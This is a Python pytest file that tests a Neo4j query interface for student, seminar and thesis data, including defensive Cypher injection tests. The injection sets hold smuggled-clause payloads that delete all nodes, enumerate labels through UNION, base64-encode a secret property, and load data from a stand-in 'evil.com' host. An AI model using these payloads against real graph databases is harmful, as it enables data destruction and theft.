import pytest
from api.neo4j_interface import Neo4jDB, ReadRequest, construct_cypher_query
from neo4j import GraphDatabase
from neo4j.exceptions import ClientError
import os
import t_helpers, conftest
from conftest import URI, AUTH

class TestCypherConstruction:
    def test_invalid_labels_injection(self):
        label_w_special_chars = {
                                # "1Label", # Labeling like this could lead to problems when requesting them without backticks
                                "-Label",
                                "Label:Label",
                                "Label.Name",
                                "Label with space"
                                }
        empty_and_spaces = {
                            "",
                            "   ",
                            "\t",
                            "\n"}
        reserved_keywords = {
                            "$param",
                            "MATCH",
                            "WHERE",
                            "RETURN",
                            "NULL",
                            "TRUE",
                            "FALSE"
                            }
        injections = {
            "Label //",
            "Label) RETURN n //",
            "Label` //",
            "Label) MATCH (n) RETURN n --",
            "Label) WITH n MATCH (m) RETURN m --",
            "Label OR 1=1",
            "` MATCH (n) DETACH DELETE n --",
            "`) MATCH (n) RETURN n UNION MATCH (m) --",
            "Label` WITH n CALL db.labels() YIELD label --",
            "Label) UNION CALL db.labels() YIELD label RETURN count(label) --",
            "Label) LOAD CSV FROM 'http://evil.com/data' AS line --",
            "Label) RETURN keys(n) --",
            "Label) CALL apoc.cypher.runMany('MATCH (n) RETURN n') YIELD result --",
            "Label) CALL apoc.text.base64Encode(n.secret) YIELD value RETURN value --"
        }
        label_w_special_chars.update(empty_and_spaces, reserved_keywords, injections)
        for l in label_w_special_chars:
            with pytest.raises(ValueError) as exc_info:
                construct_cypher_query(l)
                pytest.fail(f"Cypher Construction Test: Value Error not risen for label {l}")
            assert exc_info.type == ValueError, f"Cypher Construction did not catch special char {l}"









def test_simple_db_reads(db: "Neo4jDB"):
    "Basic Read requests from the Data-Layer Neo4jDB class"
    # Simple Request

    label1 = "Student"
    req = ReadRequest([label1], label1, 3,  None, None, None)
    records = list(db.read_data(req))
    for s in t_helpers.STUDENTS:
        assert s.f_name in [r.data()["n"]["f_name"] for r in records]

    label2 = "Seminar"
    req = ReadRequest([label2], label2, 3,  None, None, None)
    records = list(db.read_data(req))
    for c in t_helpers.SEMINARS:
        assert c.name in [r.data()["n"]["title"] for r in records]

def test_where_request(db):
    "Basic where requests from the Data-Layer Neo4jDB class"
    lbl= "Student"
    # Where
    names = [s.f_name for s in t_helpers.STUDENTS]

    for n in names:
        req = ReadRequest([lbl],
                          lbl,
                          3,
                          None,
                          {"f_name":n},
                          None)
        records = list(db.read_data(req))

        assert n in [r.data()["n"]["f_name"] for r in records] and len(records) == 1
        assert "Cookiebert Strauss" not in [r.data()["n"]["f_name"] for r in records]

def test_complex_where_requests(db):
    label = "Thesis"
    wild_filters = [
        {"department": "Science",
         "is_published": True,
         "year": 1998},
        {"grade": 99.9},
        {"topic": "Economics"},
        {"pages": 300, "keywords": ["plants", "dangerous", "forest"]},
        {"department": "Biology", "is_published": False},
        {"year": 1999, "grade": 88.0},
    ]

    for filter in wild_filters:
        req = ReadRequest([label],
                          label,
                          3,
                          None,
                          filter,
                          None)
        records = db.read_data(req)
        assert len(records) > 0, f"complex where request with {filter=} could not find a thesis"

def test_limit_request(db):
    "Basic iterative limit requests from the Data-Layer Neo4jDB class"
    # Limits
    lbl= "Student"
    for i in range(1, 8):
        req = ReadRequest([lbl], lbl, 3, i,  None, None)
        records = list(db.read_data(req))
        assert len(records) == i

def test_simple_relationships(db: "Neo4jDB"):
    "Basic relationship requests from the Data-Layer Neo4jDB class"
    label1 = "Student"

    req = ReadRequest([label1], label1, 3,  None, None, ["ENROLLED"])
    records = list(db.read_data(req))

    assert len(records) > 5, f"To little records for student-class enrolled relation {records}"
    for r in records:
         relation = r.data()["r"]
         assert relation[1] == "ENROLLED", f"[Test] , no relation in {relation}, or at least not at index 1? "

def test_unpresent_label(db):
    " Basic requests for a label that doesnt exist from the Data-Layer Neo4jDB class"
    m_label = "COOOOKIES"
    req = ReadRequest([m_label], m_label, 3,  None, None, ["ENROLLED"])
    records = list(db.read_data(req))
    assert len(records) == 0

def test_bad_limit(db):
    " Expected behavior with wrong label input"
    label1 = "Student"
    bad_limits = {-3, "f", 14.13}
    for bad_lim in bad_limits:
        req = ReadRequest(selected_labels=[label1],
                          main_label= label1,
                           max_depth= 3,
                            limit= bad_lim,
                            filter_labels=None,
                            rel_fitler=None)
        with pytest.raises(ClientError):
            db.read_data(req)


class TestCypherInjectionDBInterfaceLevel:
    INJECTION_PAYLOADS = {
    "tautology": "' OR 1=1 --",
    "union_extraction": "' UNION ALL MATCH (n) RETURN n --",
    "destructive": "'; MATCH (n) DETACH DELETE n; --",
    "malicious_label": "Student) MATCH (n) DETACH DELETE n --"
}
    def test_injection_in_where_values(self, db: "Neo4jDB"):
        """
        Attempts to inject logic into the 'where_props' values.
        If vulnerable, 'OR 1=1' would return ALL students instead of none.
        """
        malicious_name = "NonExistentUser" + TestCypherInjectionDBInterfaceLevel.INJECTION_PAYLOADS["tautology"]

        req = ReadRequest(
            selected_labels=["Student"],
            main_label="Student",
            max_depth=3,
            limit=None,
            filter_labels={"f_name": malicious_name},
            rel_fitler=None
        )

        records = list(db.read_data(req))

        assert len(records) == 0, f"Injection successful! Tautology returned{len(records)} records."

    def test_destructive_label_injection(self, db: "Neo4jDB"):
        """
        Attempts to inject Cypher into the 'selected_labels' list.
        Dynamic labels are a common vulnerability point.
        """
        req = ReadRequest(
            selected_labels=[TestCypherInjectionDBInterfaceLevel.INJECTION_PAYLOADS["malicious_label"]],
            main_label="Student",
            max_depth=1,
            limit=None,
            filter_labels=None,
            rel_fitler=None
        )

        try:
            list(db.read_data(req))
        except Exception:
            pass

        check_req = ReadRequest(
            selected_labels=["Student"],
            main_label="Student",
            max_depth=1,
            limit=None,
            filter_labels=None,
            rel_fitler=None
        )
        students = list(db.read_data(check_req))
        assert len(students) > 0, "Destructive injection in Label succeeded! Students were deleted."

    def test_injection_in_relationships(self, db: "Neo4jDB"):
        """
        Attempts to inject Cypher into the 'rel_fitler' list.
        """
        malicious_rel = "ENROLLED]-(s) RETURN s UNION CALL db.labels() --"

        req = ReadRequest(
            selected_labels=["Student"],
            main_label="Student",
            max_depth=1,
            limit=None,
            filter_labels=None,
            rel_fitler=[malicious_rel]
        )

        try:
            results = list(db.read_data(req))
            for r in results:
                data = r.data()
                assert "label" not in data, "Injection exfiltrated DB labels via UNION!"
        except Exception:
            pass

    def test_injection_in_limit(self, db: "Neo4jDB"):
        """
        Attempts to pass a string injection into the 'limit' field.
        """
        malicious_limit = "1 UNION ALL MATCH (n) RETURN n"

        req = ReadRequest(
            selected_labels=["Student"],
            main_label="Student",
            max_depth=1,
            limit=malicious_limit,
            filter_labels=None,
            rel_fitler=None
        )

        try:
            records = list(db.read_data(req))
            if len(records) > 1:
                pytest.fail("Limit injection succeeded: Query returned more than 1 result.")
        except Exception:
            pass

    def test_destructive_where_injection(self, db: "Neo4jDB"):
        """
        High-risk test: Attempts to delete the database via the filter_labels clause.
        """
        assert len(t_helpers.STUDENTS) > 0

        malicious_val = "x" + TestCypherInjectionDBInterfaceLevel.INJECTION_PAYLOADS["destructive"]

        req = ReadRequest(
            selected_labels=["Student"],
            main_label="Student",
            max_depth=1,
            limit=None,
            filter_labels={"f_name": malicious_val},
            rel_fitler=None
        )

        try:
            list(db.read_data(req))
        except Exception:
            pass

        check_req = ReadRequest(
            selected_labels=["Student"],
            main_label="Student",
            max_depth=1,
            limit=None,
            filter_labels=None,
            rel_fitler=None
        )
        remaining_students = list(db.read_data(check_req))

        assert len(remaining_students) > 0, "Destructive injection in WHERE clause succeeded! Database wiped."

